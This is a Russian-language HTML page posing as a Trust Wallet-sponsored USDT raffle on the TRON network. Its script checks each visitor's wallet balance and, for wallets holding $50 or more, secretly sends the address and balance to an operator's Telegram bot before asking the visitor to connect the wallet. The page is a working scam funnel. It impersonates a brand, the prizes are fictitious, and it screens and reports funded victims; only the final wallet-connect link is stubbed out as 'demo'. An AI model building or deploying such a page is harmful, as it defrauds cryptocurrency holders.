<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#050b16">
  <title>Raffle Check — TRON Network</title>

  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
  >

  <link
    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap"
    rel="stylesheet"
  >

  <style>
    :root {
      --bg-dark: #050b16;
      --primary: #3b82f6;
      --primary-glow: rgba(59, 130, 246, 0.5);
      --success: #10b981;
      --error: #ef4444;
      --text-main: #ffffff;
      --text-muted: #94a3b8;
      --card-bg: rgba(30, 41, 59, 0.7);
      --border: rgba(255, 255, 255, 0.1);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Inter', sans-serif;
      background-color: var(--bg-dark);
      color: var(--text-main);
      min-height: 100vh;
      overflow-x: hidden;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .site-bg {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
      background:
        radial-gradient(
          circle at 50% 0%,
          #1e293b 0%,
          #050b16 70%
        );
    }

    .glow {
      position: absolute;
      width: 600px;
      height: 600px;
      background: var(--primary);
      filter: blur(150px);
      opacity: 0.15;
      border-radius: 50%;
    }

    .glow-1 {
      top: -200px;
      left: -100px;
    }

    .glow-2 {
      bottom: -200px;
      right: -100px;
      background: #8b5cf6;
    }

    .container {
      width: 100%;
      max-width: 600px;
      padding: 20px;
      margin-top: 40px;
    }

    .hero-image-container {
      width: 100%;
      height: 250px;
      border-radius: 16px;
      overflow: hidden;
      margin-bottom: 24px;
      border: 1px solid var(--border);
      box-shadow: 0 0 20px rgba(0,0,0,0.5);
      position: relative;
    }

    .hero-image {
      width: 100%;
      height: 100%;
      object-fit: cover;
      object-position: center;
    }

    h1 {
      font-size: 28px;
      font-weight: 800;
      text-align: center;
      margin-bottom: 12px;
      background: linear-gradient(to right, #fff, #94a3b8);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    .subtitle {
      text-align: center;
      color: var(--text-muted);
      font-size: 15px;
      line-height: 1.5;
      margin-bottom: 24px;
    }

    .prize-info {
      background: rgba(59, 130, 246, 0.1);
      border: 1px solid rgba(59, 130, 246, 0.3);
      border-radius: 12px;
      padding: 16px;
      margin-bottom: 24px;
    }

    .prize-row {
      display: flex;
      justify-content: space-between;
      margin-bottom: 8px;
      font-size: 14px;
    }

    .prize-row:last-child {
      margin-bottom: 0;
    }

    .prize-val {
      color: var(--success);
      font-weight: 700;
    }

    .card {
      background: var(--card-bg);
      backdrop-filter: blur(12px);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 24px;
      margin-bottom: 20px;
    }

    label {
      display: block;
      font-size: 13px;
      color: var(--text-muted);
      margin-bottom: 8px;
      font-weight: 500;
    }

    .input-wrap {
      position: relative;
      margin-bottom: 16px;
    }

    input {
      width: 100%;
      background: rgba(0, 0, 0, 0.3);
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 14px 14px 14px 40px;
      color: #fff;
      font-family: monospace;
      font-size: 15px;
      outline: none;
      transition: 0.2s;
    }

    input:focus {
      border-color: var(--primary);
      box-shadow:
        0 0 0 3px rgba(59, 130, 246, 0.2);
    }

    .input-icon {
      position: absolute;
      left: 14px;
      top: 50%;
      transform: translateY(-50%);
      color: var(--text-muted);
    }

    .btn {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      padding: 14px;
      border-radius: 10px;
      font-weight: 600;
      font-size: 15px;
      cursor: pointer;
      transition: 0.2s;
      border: none;
      text-decoration: none;
      gap: 8px;
    }

    .btn-primary {
      background: var(--primary);
      color: white;
      box-shadow:
        0 4px 14px rgba(59, 130, 246, 0.4);
    }

    .btn-primary:hover {
      background: #2563eb;
      transform: translateY(-1px);
    }

    .btn-secondary {
      background: rgba(255, 255, 255, 0.1);
      color: white;
    }

    .btn-secondary:hover {
      background: rgba(255, 255, 255, 0.15);
    }

    .btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      transform: none;
    }

    .status-msg {
      margin-top: 16px;
      padding: 12px;
      border-radius: 8px;
      font-size: 14px;
      align-items: center;
      gap: 10px;
    }

    .status-error {
      background: rgba(239, 68, 68, 0.1);
      border: 1px solid rgba(239, 68, 68, 0.3);
      color: #fca5a5;
      display: flex;
    }

    .status-success {
      background: rgba(16, 185, 129, 0.1);
      border: 1px solid rgba(16, 185, 129, 0.3);
      color: #6ee7b7;
      display: flex;
    }

    .status-loading {
      color: var(--text-muted);
      display: flex;
      justify-content: center;
    }

    .warning-box {
      font-size: 12px;
      color: var(--text-muted);
      text-align: center;
      margin-top: 20px;
      line-height: 1.4;
    }

    .warning-box i {
      color: #f59e0b;
      margin-right: 4px;
    }

    .spinner {
      width: 16px;
      height: 16px;
      border: 2px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s ease-in-out infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    [hidden] {
      display: none !important;
    }
  </style>
</head>

<body>

  <div class="site-bg">
    <div class="glow glow-1"></div>
    <div class="glow glow-2"></div>
  </div>

  <div class="container">

    <div class="hero-image-container">
      <img
        src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRaG1Ay-no9Desc-6ZsW9vLJlUL4j2cVyNHDKs_OMgGBg&s=10"
        alt="Trust Wallet Raffle"
        class="hero-image"
      >
    </div>

    <h1>Мега Розыгрыш</h1>

    <div class="prize-info">

      <div class="prize-row">
        <span>🥇 3 Победителя</span>
        <span class="prize-val">$2000 USDT</span>
      </div>

      <div class="prize-row">
        <span>🥈 5 Победителей</span>
        <span class="prize-val">$500 USDT</span>
      </div>

      <div
        class="prize-row"
        style="
          margin-top: 8px;
          border-top: 1px solid rgba(255,255,255,0.1);
          padding-top: 8px;
        "
      >
        <span>📅 Итоги:</span>
        <span>29.10.26</span>
      </div>

    </div>

    <p class="subtitle">
      Участие абсолютно бесплатно при поддержке Trust Wallet.<br>

      <strong>Важно:</strong>
      Пустые кошельки не допускаются.
      Минимальный баланс для участия —
      <strong>$50</strong>
      в любых активах сети TRC-20.
    </p>

    <!-- STEP 1 -->

    <div id="stepCheck" class="card">

      <label for="walletAddress">
        Введите ваш адрес TRC-20 (TRX)
      </label>

      <div class="input-wrap">

        <i class="fa-solid fa-wallet input-icon"></i>

        <input
          type="text"
          id="walletAddress"
          placeholder="T..."
          maxlength="34"
          autocomplete="off"
        >

      </div>

      <button
        id="checkBtn"
        class="btn btn-primary"
      >
        <i class="fa-solid fa-magnifying-glass"></i>
        Проверить возможность участия
      </button>

      <div
        id="loadingMsg"
        class="status-msg status-loading"
        hidden
      >
        <div class="spinner"></div>
        <span>
          Проверка баланса в сети TRON...
        </span>
      </div>

      <div
        id="errorMsg"
        class="status-msg status-error"
        hidden
      >
        <i class="fa-solid fa-circle-exclamation"></i>
        <span id="errorText">Ошибка</span>
      </div>

    </div>

    <!-- STEP 2 -->

    <div
      id="stepSuccess"
      class="card"
      hidden
    >

      <div
        style="
          text-align: center;
          margin-bottom: 16px;
        "
      >

        <i
          class="fa-solid fa-circle-check"
          style="
            font-size: 40px;
            color: var(--success);
            margin-bottom: 10px;
          "
        ></i>

        <h3 style="margin-bottom: 5px;">
          Кошелек подходит!
        </h3>

        <p
          style="
            color: var(--text-muted);
            font-size: 14px;
          "
        >
          Баланс подтвержден (&gt; $50).
        </p>

      </div>

      <p
        style="
          font-size: 14px;
          margin-bottom: 16px;
          text-align: center;
        "
      >
        Для финальной регистрации в розыгрыше
        подключите кошелек.
      </p>

      <a
        href="#"
        onclick="
          alert(
            'Это демо-код. Для реального проекта используйте безопасную официальную ссылку dApp.'
          );
          return false;
        "
        class="btn btn-primary"
      >
        <i class="fa-solid fa-link"></i>
        Подключить кошелек для регистрации
      </a>

      <button
        id="resetBtn"
        class="btn btn-secondary"
        style="margin-top: 10px;"
      >
        Проверить другой кошелек
      </button>

    </div>

    <div class="warning-box">

      <i class="fa-solid fa-shield-halved"></i>

      Мы никогда не запрашиваем Seed-фразу
      или приватные ключи.<br>

      Проверка осуществляется только по
      публичному адресу через блокчейн.

    </div>

  </div>

  <script>

    // =========================================================
    // TELEGRAM BOT — ТЕСТОВАЯ НАСТРОЙКА
    // =========================================================

    /*
      ВСТАВЬ СЮДА ТОКЕН ТЕСТОВОГО БОТА.

      Например:

      const BOT_TOKEN = "123456789:AAxxxxxxxxxxxxxxxx";

      НЕ используй здесь токен бота, который используется
      для чего-либо важного, потому что токен находится
      непосредственно в браузере.
    */

    const BOT_TOKEN =
      "ВСТАВЬ_СЮДА_ТОКЕН_БОТА";

    /*
      ID Telegram-чата, куда бот будет отправлять
      уведомления.

      Например:

      const ADMIN_CHAT_ID = "123456789";

      Для группы это может выглядеть иначе.
    */

    const ADMIN_CHAT_ID =
      "ВСТАВЬ_СЮДА_CHAT_ID";


    // =========================================================
    // ОТПРАВКА СООБЩЕНИЯ В TELEGRAM
    // =========================================================

    async function sendTelegramMessage(text) {

      if (
        BOT_TOKEN === "ВСТАВЬ_СЮДА_ТОКЕН_БОТА" ||
        ADMIN_CHAT_ID === "ВСТАВЬ_СЮДА_CHAT_ID"
      ) {

        console.warn(
          "Telegram не настроен: укажи BOT_TOKEN и ADMIN_CHAT_ID."
        );

        return false;
      }

      const telegramURL =
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

      try {

        const response = await fetch(
          telegramURL,
          {
            method: "POST",

            headers: {
              "Content-Type": "application/json"
            },

            body: JSON.stringify({
              chat_id: ADMIN_CHAT_ID,
              text: text,
              parse_mode: "HTML"
            })
          }
        );

        const data = await response.json();

        console.log(
          "Telegram response:",
          data
        );

        if (!data.ok) {

          console.error(
            "Telegram API error:",
            data
          );

          return false;
        }

        return true;

      } catch (error) {

        console.error(
          "Ошибка отправки в Telegram:",
          error
        );

        return false;
      }
    }


    // =========================================================
    // DOM
    // =========================================================

    const checkBtn =
      document.getElementById("checkBtn");

    const walletInput =
      document.getElementById("walletAddress");

    const loadingMsg =
      document.getElementById("loadingMsg");

    const errorMsg =
      document.getElementById("errorMsg");

    const errorText =
      document.getElementById("errorText");

    const stepCheck =
      document.getElementById("stepCheck");

    const stepSuccess =
      document.getElementById("stepSuccess");

    const resetBtn =
      document.getElementById("resetBtn");


    // =========================================================
    // ПРОВЕРКА TRON
    // =========================================================

    async function checkTronBalance(address) {

      const url =
        `https://api.trongrid.io/v1/accounts/${address}`;

      try {

        const response =
          await fetch(url);

        if (!response.ok) {

          throw new Error(
            "Адрес не найден или ошибка сети."
          );
        }

        const data =
          await response.json();

        if (
          !data.data ||
          data.data.length === 0
        ) {

          throw new Error(
            "Кошелек пуст или не активирован в сети TRON."
          );
        }

        const account =
          data.data[0];

        // TRX

        const trxBalance =
          (account.balance || 0) / 1000000;


        // USDT TRC-20

        let usdtBalance = 0;

        const usdtContract =
          "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

        if (account.trc20) {

          if (
            account.trc20[usdtContract]
          ) {

            usdtBalance =
              account.trc20[usdtContract] / 1000000;
          }
        }


        // Тестовый курс TRX

        const trxEstimatedUSD =
          trxBalance * 0.25;


        const totalEstimatedUSD =
          usdtBalance + trxEstimatedUSD;


        return {

          valid: true,

          balanceUSD:
            totalEstimatedUSD,

          details:
            `USDT: ${usdtBalance.toFixed(2)} | TRX: ${trxBalance.toFixed(2)}`,

          trx:
            trxBalance,

          usdt:
            usdtBalance
        };

      } catch (err) {

        throw err;
      }
    }


    // =========================================================
    // ПРОВЕРКА КНОПКИ
    // =========================================================

    checkBtn.addEventListener(
      "click",
      async () => {

        const address =
          walletInput.value.trim();


        // Сбрасываем ошибки

        errorMsg.hidden = true;

        loadingMsg.hidden = true;


        // Валидация

        if (
          !address.startsWith("T") ||
          address.length !== 34
        ) {

          showError(
            'Некорректный адрес TRC-20. Он должен начинаться с "T" и содержать 34 символа.'
          );

          return;
        }


        loadingMsg.hidden = false;

        checkBtn.disabled = true;


        try {

          const result =
            await checkTronBalance(address);


          // =================================================
          // БАЛАНС >= $50
          // =================================================

          if (
            result.balanceUSD >= 50
          ) {

            /*
              Отправляем уведомление в Telegram.

              Передаётся только публичный адрес,
              баланс и результат проверки.
            */

            const telegramMessage =

              `🎟 <b>Новая проверка кошелька</b>\n\n` +

              `💳 <b>TRON адрес:</b>\n` +

              `<code>${escapeHTML(address)}</code>\n\n` +

              `💰 <b>Баланс:</b> ` +

              `$${result.balanceUSD.toFixed(2)}\n\n` +

              `📊 ${escapeHTML(result.details)}\n\n` +

              `✅ <b>Статус:</b> подходит\n\n` +

              `🕐 <b>Время:</b> ` +

              `${new Date().toLocaleString("ru-RU")}`;


            await sendTelegramMessage(
              telegramMessage
            );


            // Показываем успешный результат

            stepCheck.hidden = true;

            stepSuccess.hidden = false;

          }


          // =================================================
          // БАЛАНС < $50
          // =================================================

          else {

            showError(
              `Баланс недостаточен. Ваш примерный баланс: ~$${result.balanceUSD.toFixed(2)}. Необходимо минимум $50.`
            );
          }


        } catch (err) {

          showError(
            err.message ||
            "Ошибка при проверке блокчейна."
          );

        } finally {

          loadingMsg.hidden = true;

          checkBtn.disabled = false;
        }

      }
    );


    // =========================================================
    // RESET
    // =========================================================

    resetBtn.addEventListener(
      "click",
      () => {

        stepSuccess.hidden = true;

        stepCheck.hidden = false;

        walletInput.value = "";

        errorMsg.hidden = true;
      }
    );


    // =========================================================
    // ERROR
    // =========================================================

    function showError(msg) {

      errorText.textContent = msg;

      errorMsg.hidden = false;

      loadingMsg.hidden = true;

      checkBtn.disabled = false;
    }


    // =========================================================
    // HTML ESCAPE
    // =========================================================

    function escapeHTML(value) {

      return String(value)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
    }

  </script>

</body>
</html>
